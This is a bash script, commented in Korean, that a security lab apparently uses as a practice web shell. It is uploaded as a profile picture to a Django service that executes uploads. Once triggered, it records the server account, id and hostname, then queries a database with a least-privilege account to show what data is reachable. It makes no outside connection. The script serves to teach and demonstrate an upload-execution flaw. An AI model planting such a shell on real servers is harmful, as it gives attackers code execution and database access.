#!/usr/bin/env bash
# [실습 웹쉘 예시 - .sh] 프로필 사진으로 업로드한 뒤, 업로드 실행 서비스의
# URL(http://localhost:8000/uploads/run/webshell.sh)에 '접근'하면 Django 가 이 스크립트를 '실행'한다.
#
# 수행 내용(외부 연결/리버스 셸 없음):
#   1) 실행 계정/환경을 증거 파일로 남긴다 (서버 측 실행 증명).
#   2) 최소 권한 DB 계정으로 접근 가능한 '범위'를 확인한다.
#      - demo_records 테이블: 조회 성공(유출 범위 내)
#      - auth_user 테이블   : 권한 거부 기대(유출 범위 밖)
# 증거 디렉터리: 실행 서비스의 문서 루트(LAB_EXEC_DOCROOT) 하위 _evidence.
# 실행 서비스는 cwd 를 문서 루트로 두고 스크립트를 실행하므로 $PWD 도 동일하다.
EV="${LAB_EXEC_DOCROOT:-$(pwd)}/_evidence"
mkdir -p "$EV"
TS=$(date +%Y%m%d_%H%M%S)
OUT="$EV/pwned_${TS}.txt"

{
  echo "=== 서버 측 실행 증거 (server-side execution evidence) ==="
  echo "time    : $(date -Is 2>/dev/null || date)"
  echo "whoami  : $(whoami)"
  echo "id      : $(id 2>/dev/null)"
  echo "hostname: $(hostname)"
  echo "pwd     : $(pwd)"
  echo
  echo "=== DB 접근 '범위' (최소 권한 계정 ${LAB_LEAK_DB_USER}) ==="
  export PGPASSWORD="${LAB_LEAK_DB_PASSWORD}"
  echo "[demo_records_democustomer] 유출 범위 내 (조회 성공 기대):"
  psql -h "${LAB_LEAK_DB_HOST}" -U "${LAB_LEAK_DB_USER}" -d "${LAB_LEAK_DB_NAME}" \
       -c "SELECT count(*) AS rows FROM demo_records_democustomer;" 2>&1
  echo
  echo "[auth_user] 유출 범위 밖 (권한 거부 기대):"
  psql -h "${LAB_LEAK_DB_HOST}" -U "${LAB_LEAK_DB_USER}" -d "${LAB_LEAK_DB_NAME}" \
       -c "SELECT count(*) FROM auth_user;" 2>&1
} | tee "$OUT"

echo
echo "[+] 증거 파일 생성: $OUT"
